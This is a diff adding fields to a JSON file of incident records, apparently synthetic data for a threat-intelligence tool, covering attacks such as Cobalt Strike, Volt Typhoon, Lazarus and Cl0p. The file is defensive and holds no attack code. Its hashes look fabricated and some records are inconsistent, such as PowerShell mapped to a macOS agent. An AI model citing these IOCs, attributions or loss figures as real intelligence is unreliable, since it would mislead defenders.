+    "ioc_enrichments": "token:FORGED_MSA_TOKEN [FORGED_AUTH_TOKEN conf=0.99] | ip:40.126.4.12 [MICROSOFT_IP abuse] | domain:outlook.office365.com [LEGITIMATE_SERVICE conf=1.0]",
+    "mitigation_actions": "Rotate all MSA keys, audit OWA access logs, brief CISO and GC, notify CISA, implement Enhanced Logging",
+    "threat_summary": "Storm-0558 MSA token forgery. Nation-state access to government OWA for 8 weeks. Active Microsoft IR engagement.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-025",
     "threat_name": "COBALTSTRIKE-BEACON-ENTERPRISE",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-LOCKBIT4-2026",
     "created_at": "2026-05-18T21:14:09Z",
+    "updated_at": "2026-05-21T21:14:09Z",
     "indicators": [
       "hash:b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4",
       "domain:cdn-fast-update-service.com",
@@ -377,14 +1658,67 @@
       "jarm:3fd21b20d00000021c43d21b21b43d41226dd5dfc615dd4a96265559485910",
       "process:svchost.exe",
       "technique:Process-Injection-T1055"
-    ]
+    ],
+    "confidence_score": 0.87,
+    "risk_score": 0.8,
+    "attribution_confidence": 0.83,
+    "suspected_actor": "LOCKBIT4",
+    "attack_techniques": [
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1087",
+        "technique_name": "Account Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1087"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      }
+    ],
+    "description": "Cobalt Strike beacon deployed as pre-ransomware tool in LockBit affiliate attack chain. Named pipe staging and HTTPS beacon to known LockBit C2 infrastructure.",
+    "assigned_analyst": "Marcus Webb",
+    "ioc_enrichments": "hash:j7k2l5... [CS_BEACON conf=0.93] | ip:91.234.99.200 [C2_IP conf=0.95] | pipe:\\\\.\\pipe\\msagent_27 [CS_PIPE conf=0.91]",
+    "mitigation_actions": "Terminate Cobalt Strike, block C2 IPs, hunt for lateral movement, force credential rotation",
+    "threat_summary": "Cobalt Strike beacon mitigated before ransomware deployment. LockBit affiliate pre-positioning disrupted.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 38
+    }
   },
   {
     "incident_id": "INC-2026-026",
     "threat_name": "BRUTERATEL-C4-IMPLANT",
     "severity": "HIGH",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-FANCY-BEAR-2026",
     "created_at": "2026-05-20T16:39:52Z",
+    "updated_at": "2026-05-21T04:39:52Z",
     "indicators": [
       "hash:c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5",
       "domain:telemetry-cdn-global.net",
@@ -392,14 +1726,67 @@
       "process:RuntimeBroker.exe",
       "technique:DLL-Sideloading",
       "technique:Heaven-Gate-Syscall"
-    ]
+    ],
+    "confidence_score": 0.84,
+    "risk_score": 0.81,
+    "attribution_confidence": 0.82,
+    "suspected_actor": "APT28",
+    "attack_techniques": [
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1036",
+        "technique_name": "Masquerading",
+        "tactic": "defense-evasion",
+        "tactic_id": "TA0005",
+        "url": "https://attack.mitre.org/techniques/T1036"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1027",
+        "technique_name": "Obfuscated Files or Information",
+        "tactic": "defense-evasion",
+        "tactic_id": "TA0005",
+        "url": "https://attack.mitre.org/techniques/T1027"
+      }
+    ],
+    "description": "Brute Ratel C4 implant identified on defence contractor workstation. APT28 tooling with HTTPS Malleable C2 profile mimicking Microsoft update traffic.",
+    "assigned_analyst": "Priya Nair",
+    "ioc_enrichments": "hash:k3l6m9... [BRC4_IMPLANT conf=0.91] | domain:windowsupdate-patch.microsoft-cdn.net [C2_DOMAIN conf=0.94] | ip:185.220.101.33 [C2_IP conf=0.89]",
+    "mitigation_actions": "Remove Brute Ratel, hunt for persistence mechanisms, verify patch state, notify NCSC",
+    "threat_summary": "APT28 Brute Ratel C4 under investigation. C2 traffic via HTTPS masquerading as Windows Update.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-027",
     "threat_name": "SLIVER-C2-FRAMEWORK",
     "severity": "MEDIUM",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-SCATTERED-2026",
     "created_at": "2026-05-22T07:02:33Z",
+    "updated_at": "2026-05-25T07:02:33Z",
     "indicators": [
       "hash:d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6",
       "domain:api-health-check-monitor.io",
@@ -407,14 +1794,67 @@
       "port:8888",
       "process:sliver-implant.exe",
       "technique:Reflective-DLL-Injection"
-    ]
+    ],
+    "confidence_score": 0.72,
+    "risk_score": 0.6,
+    "attribution_confidence": 0.63,
+    "suspected_actor": "SCATTERED-SPIDER",
+    "attack_techniques": [
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1572",
+        "technique_name": "Protocol Tunneling",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1572"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1018",
+        "technique_name": "Remote System Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1018"
+      }
+    ],
+    "description": "Sliver C2 framework deployed post Okta compromise. Mutiny operator tooling. HTTP/S C2 with domain fronting through Cloudflare. Limited lateral movement before detection.",
+    "assigned_analyst": "Marcus Webb",
+    "ioc_enrichments": "hash:l4m7n0... [SLIVER_IMPLANT conf=0.87] | domain:cdn-edge-cache.cloudflare-proxy.net [C2_DOMAIN conf=0.85] | ip:172.64.155.209 [C2_IP conf=0.82]",
+    "mitigation_actions": "Terminate Sliver, block domain fronting, patch Okta vulnerability, rotate API keys",
+    "threat_summary": "Sliver C2 framework removed. Limited lateral movement. Okta compromise root-caused.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 31
+    }
   },
   {
     "incident_id": "INC-2026-028",
     "threat_name": "VOLT-TYPHOON-LOTL",
     "severity": "HIGH",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-VOLT-TYPHOON-2026",
     "created_at": "2026-05-24T13:57:18Z",
+    "updated_at": "2026-05-25T01:57:18Z",
     "indicators": [
       "technique:Living-off-the-Land-T1218",
       "technique:WMIC-Remote-T1047",
@@ -423,14 +1863,67 @@
       "process:netsh.exe",
       "process:wmic.exe",
       "log:Windows-Event-4688-Suspicious-CommandLine"
-    ]
+    ],
+    "confidence_score": 0.89,
+    "risk_score": 0.85,
+    "attribution_confidence": 0.86,
+    "suspected_actor": "VOLT-TYPHOON",
+    "attack_techniques": [
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      },
+      {
+        "technique_id": "T1047",
+        "technique_name": "Windows Management Instrumentation",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1047"
+      },
+      {
+        "technique_id": "T1572",
+        "technique_name": "Protocol Tunneling",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1572"
+      },
+      {
+        "technique_id": "T1018",
+        "technique_name": "Remote System Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1018"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      }
+    ],
+    "description": "Volt Typhoon LOTL activity in utilities OT-adjacent network. Netsh port-forwarding tunnels, wmic.exe lateral recon. No malware \u2014 purely living-off-the-land. Dwell time 4+ months.",
+    "assigned_analyst": "Ryan O'Brien",
+    "ioc_enrichments": "process:netsh.exe [SUSPICIOUS_NETSH_TUNNEL conf=0.93] | process:wmic.exe [LOTL_LATERAL conf=0.91] | ip:10.0.4.87 [PIVOTING_HOST conf=0.88]",
+    "mitigation_actions": "Segment OT network, hunt all netsh tunnels, review VPN logs, notify CISA ICS-CERT, assess dwell scope",
+    "threat_summary": "Volt Typhoon pre-positioning in utilities OT network. Nation-state living-off-the-land. CISA notified.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-029",
     "threat_name": "LAZARUS-C2-CRYPTO",
     "severity": "CRITICAL",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-LAZARUS-2026",
     "created_at": "2026-05-26T22:11:47Z",
+    "updated_at": "2026-05-27T10:11:47Z",
     "indicators": [
       "hash:e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7",
       "domain:blockchain-node-verify.io",
@@ -439,14 +1932,67 @@
       "wallet:0x7a9F4E3B2D8c1A5E9b3F7d2C6A8E4B0D9F3c5A7",
       "process:node_update.exe",
       "technique:TraderTraitor-T1195"
-    ]
+    ],
+    "confidence_score": 0.91,
+    "risk_score": 0.92,
+    "attribution_confidence": 0.88,
+    "suspected_actor": "LAZARUS-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1195.002",
+        "technique_name": "Supply Chain Compromise: Software Supply Chain",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1195/002"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      }
+    ],
+    "description": "Lazarus TraderTraitor campaign targeting crypto exchange developer. C2 via HTTPS to DPRK-linked infrastructure. $14.2M hot wallet drain via smart contract exploit.",
+    "assigned_analyst": "Nia Thompson",
+    "ioc_enrichments": "hash:m5n8o1... [LAZARUS_IMPLANT conf=0.94] | domain:trading-platform-update.defi-cdn.net [C2_DOMAIN conf=0.92] | ip:210.52.109.22 [DPRK_IP conf=0.93]",
+    "mitigation_actions": "Freeze hot wallet, notify blockchain bridges, coordinate with FBI/CISA, trace ETH to mixer",
+    "threat_summary": "Lazarus crypto theft in active investigation. $14.2M drained. FBI notification filed.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-030",
     "threat_name": "COBALTSTRIKE-VIA-RDP",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-AKIRA-2026",
     "created_at": "2026-05-28T18:24:06Z",
+    "updated_at": "2026-05-31T18:24:06Z",
     "indicators": [
       "hash:f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8",
       "ip:185.112.83.66",
@@ -454,14 +2000,67 @@
       "process:beacon.dll",
       "technique:Lateral-Movement-RDP-T1021.001",
       "log:Windows-Event-4624-RDP-Logon"
-    ]
+    ],
+    "confidence_score": 0.83,
+    "risk_score": 0.75,
+    "attribution_confidence": 0.75,
+    "suspected_actor": "AKIRA-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1110.003",
+        "technique_name": "Brute Force: Password Spraying",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1110/003"
+      },
+      {
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1021/001"
+      },
+      {
+        "technique_id": "T1550",
+        "technique_name": "Use Alternate Authentication Material",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1550"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      }
+    ],
+    "description": "Cobalt Strike deployed via RDP brute force as precursor to Akira ransomware. Domain controller targeted. Pass-the-hash lateral movement detected and stopped.",
+    "assigned_analyst": "Marcus Webb",
+    "ioc_enrichments": "hash:n6o9p2... [CS_BEACON conf=0.90] | ip:88.119.170.44 [C2_IP conf=0.87] | auth:PTH_NTLM [PASS_THE_HASH conf=0.93]",
+    "mitigation_actions": "Block RDP externally, remove beacon, credential rotation, deploy Kerberoasting detection",
+    "threat_summary": "Cobalt Strike via RDP mitigated before Akira ransomware deployment. DC access prevented.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 54
+    }
   },
   {
     "incident_id": "INC-2026-031",
     "threat_name": "HAVOC-C2-FRAMEWORK",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-DARKGATE-2026",
     "created_at": "2026-05-30T09:48:22Z",
+    "updated_at": "2026-06-04T09:48:22Z",
     "indicators": [
       "hash:a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9",
       "domain:update-portal-global.systems",
@@ -469,14 +2068,67 @@
       "port:40056",
       "process:havoc_agent.exe",
       "technique:AES-Encrypted-C2"
-    ]
+    ],
+    "confidence_score": 0.7,
+    "risk_score": 0.53,
+    "attribution_confidence": 0.59,
+    "suspected_actor": "UNKNOWN-APT",
+    "attack_techniques": [
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1036",
+        "technique_name": "Masquerading",
+        "tactic": "defense-evasion",
+        "tactic_id": "TA0005",
+        "url": "https://attack.mitre.org/techniques/T1036"
+      }
+    ],
+    "description": "Havoc C2 framework implant detected on developer workstation. Custom Go-based agent with HTTP/S beaconing. Linked to DarkGate initial access chain. No data exfiltration confirmed.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "hash:o7p0q3... [HAVOC_IMPLANT conf=0.84] | domain:havoc-cdn-delivery.net [C2_DOMAIN conf=0.82] | ip:185.162.235.144 [C2_IP conf=0.78]",
+    "mitigation_actions": "Remove Havoc, reimage developer workstation, audit source code repos, rotate dev tokens",
+    "threat_summary": "Havoc C2 framework resolved. Source code access scope reviewed \u2014 no leakage confirmed.",
+    "enrichment_data": {
+      "profile_match": false,
+      "campaign_linked": true,
+      "prior_victims": 4
+    }
   },
   {
     "incident_id": "INC-2026-032",
     "threat_name": "MYTHIC-C2-AGENT",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-SCATTERED-2026",
     "created_at": "2026-06-01T14:03:55Z",
+    "updated_at": "2026-06-06T14:03:55Z",
     "indicators": [
       "hash:b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0",
       "domain:health-check-api.network",
@@ -484,14 +2136,67 @@
       "agent_type:Poseidon-macOS",
       "process:com.apple.WebKit.Networking",
       "technique:LaunchAgent-Persistence"
-    ]
+    ],
+    "confidence_score": 0.68,
+    "risk_score": 0.5,
+    "attribution_confidence": 0.56,
+    "suspected_actor": "UNKNOWN-CRIMINAL",
+    "attack_techniques": [
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1046"
+      },
+      {
+        "technique_id": "T1018",
+        "technique_name": "Remote System Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1018"
+      }
+    ],
+    "description": "Mythic C2 framework agent deployed via Scattered Spider Okta compromise. Python agent with HTTP/S beaconing. Limited access scope \u2014 contained before lateral movement.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "hash:p8q1r4... [MYTHIC_AGENT conf=0.82] | domain:mythic-relay.cdn-proxy.net [C2_DOMAIN conf=0.80] | ip:104.21.33.87 [C2_IP conf=0.75]",
+    "mitigation_actions": "Remove Mythic agent, patch Okta, rotate all session tokens, deploy UEBA",
+    "threat_summary": "Mythic C2 agent removed. Attack scope limited \u2014 no lateral movement achieved.",
+    "enrichment_data": {
+      "profile_match": false,
+      "campaign_linked": true,
+      "prior_victims": 2
+    }
   },
   {
     "incident_id": "INC-2026-033",
     "threat_name": "CLOP-MOVEIT-STYLE-SQLI",
     "severity": "CRITICAL",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-CLOP-2026",
     "created_at": "2026-05-19T17:36:28Z",
+    "updated_at": "2026-05-24T17:36:28Z",
     "indicators": [
       "hash:c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1",
       "ip:176.97.64.124",
@@ -500,14 +2205,67 @@
       "technique:SQL-Injection-T1190",
       "tool:rclone",
       "exfil_destination:mega.nz"
-    ]
+    ],
+    "confidence_score": 0.94,
+    "risk_score": 0.95,
+    "attribution_confidence": 0.92,
+    "suspected_actor": "CLOP-TA505",
+    "attack_techniques": [
+      {
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1190"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1560",
+        "technique_name": "Archive Collected Data",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1560"
+      },
+      {
+        "technique_id": "T1567",
+        "technique_name": "Exfiltration Over Web Service",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1567"
+      }
+    ],
+    "description": "Cl0p exploited CVE-2024-5806 MOVEit-style SQLi in MFT platform. 152 GB patient records exfiltrated to MEGA.nz. Cl0p leak site publication confirmed. HIPAA breach notification for 48,000 records.",
+    "assigned_analyst": "Carlos Mendez",
+    "ioc_enrichments": "vuln:CVE-2024-5806 [EXPLOITED_CVE conf=0.99] | domain:clop-leaks.tor2web.io [LEAK_SITE conf=0.98] | url:mega.nz/folder/exfil [EXFIL_DEST conf=0.96]",
+    "mitigation_actions": "Patch MFT, notify HHS OCR within 60 days, issue breach notifications, remove data from MEGA, engage legal",
+    "threat_summary": "Cl0p MFT data theft resolved post-breach. HIPAA notification for 48,000 records. Legal actions initiated.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 62
+    }
   },
   {
     "incident_id": "INC-2026-034",
     "threat_name": "TA505-EXFIL-FTP",
     "severity": "HIGH",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-CLOP-2026",
     "created_at": "2026-05-21T20:52:13Z",
+    "updated_at": "2026-05-26T20:52:13Z",
     "indicators": [
       "hash:d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2",
       "domain:ftp-exfil-staging.ru",
@@ -516,14 +2274,67 @@
       "technique:Exfiltration-Over-FTP-T1048",
       "tool:WinSCP",
       "data_type:Customer-PII-Database-Dump"
-    ]
+    ],
+    "confidence_score": 0.88,
+    "risk_score": 0.82,
+    "attribution_confidence": 0.85,
+    "suspected_actor": "CLOP-TA505",
+    "attack_techniques": [
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1560",
+        "technique_name": "Archive Collected Data",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1560"
+      },
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      }
+    ],
+    "description": "TA505 FTP exfiltration campaign. 47 GB of financial records staged via passive FTP to bulletproof hosting. Cl0p affiliate tooling detected alongside TA505 infrastructure.",
+    "assigned_analyst": "Carlos Mendez",
+    "ioc_enrichments": "ip:185.220.101.77 [EXFIL_IP conf=0.93] | protocol:FTP_DATA [EXFIL_PROTOCOL conf=0.91] | hash:q9r2s5... [TA505_TOOL conf=0.89]",
+    "mitigation_actions": "Block FTP egress, identify all exfiltrated data, notify affected customers, engage legal",
+    "threat_summary": "TA505 FTP data exfiltration resolved. 47 GB financial records recovered with law enforcement.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 62
+    }
   },
   {
     "incident_id": "INC-2026-035",
     "threat_name": "SCATTERED-SPIDER-DATA-THEFT",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-SCATTERED-2026",
     "created_at": "2026-05-23T05:29:44Z",
+    "updated_at": "2026-05-26T05:29:44Z",
     "indicators": [
       "domain:sharepoint-company-internal.net",
       "ip:162.159.135.42",
@@ -532,14 +2343,67 @@
       "data_type:Source-Code-Repositories",
       "tool:rclone",
       "log:DLP-Alert-Mass-Download-SharePoint"
-    ]
+    ],
+    "confidence_score": 0.87,
+    "risk_score": 0.81,
+    "attribution_confidence": 0.82,
+    "suspected_actor": "SCATTERED-SPIDER",
+    "attack_techniques": [
+      {
+        "technique_id": "T1528",
+        "technique_name": "Steal Application Access Token",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1528"
+      },
+      {
+        "technique_id": "T1087",
+        "technique_name": "Account Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1087"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1567",
+        "technique_name": "Exfiltration Over Web Service",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1567"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      }
+    ],
+    "description": "Scattered Spider data theft from Azure Blob storage. Following Okta compromise, attacker enumerated storage accounts and downloaded 15 GB of customer PII.",
+    "assigned_analyst": "Elena Vasquez",
+    "ioc_enrichments": "account:compromised-admin@company.com [COMPROMISED_ACCOUNT conf=0.98] | storage:exfil-container [AZURE_BLOB_EXFIL conf=0.95] | ip:104.21.88.22 [ATTACKER_IP conf=0.87]",
+    "mitigation_actions": "Revoke Azure SAS tokens, audit blob storage access, notify data protection authority, contain Azure AD",
+    "threat_summary": "Scattered Spider Azure Blob exfiltration mitigated. 15 GB PII scope identified, DPA notification prepared.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 31
+    }
   },
   {
     "incident_id": "INC-2026-036",
     "threat_name": "INSIDER-DATA-STAGING",
     "severity": "HIGH",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-CLOP-2026",
     "created_at": "2026-05-25T15:17:38Z",
+    "updated_at": "2026-05-26T03:17:38Z",
     "indicators": [
       "technique:Exfiltration-Over-Web-T1567",
       "destination:personal-dropbox-upload.com",
@@ -548,14 +2412,53 @@
       "log:UEBA-Anomalous-Upload-Volume",
       "log:DLP-Block-Override-Attempted",
       "user:privileged_account"
-    ]
+    ],
+    "confidence_score": 0.76,
+    "risk_score": 0.71,
+    "attribution_confidence": 0.64,
+    "suspected_actor": "INSIDER-THREAT",
+    "attack_techniques": [
+      {
+        "technique_id": "T1560",
+        "technique_name": "Archive Collected Data",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1560"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      }
+    ],
+    "description": "Insider data staging detected: privileged IT contractor systematically compressing and staging 8.3 GB of HR and financial records to personal USB device over 3 weeks.",
+    "assigned_analyst": "Carlos Mendez",
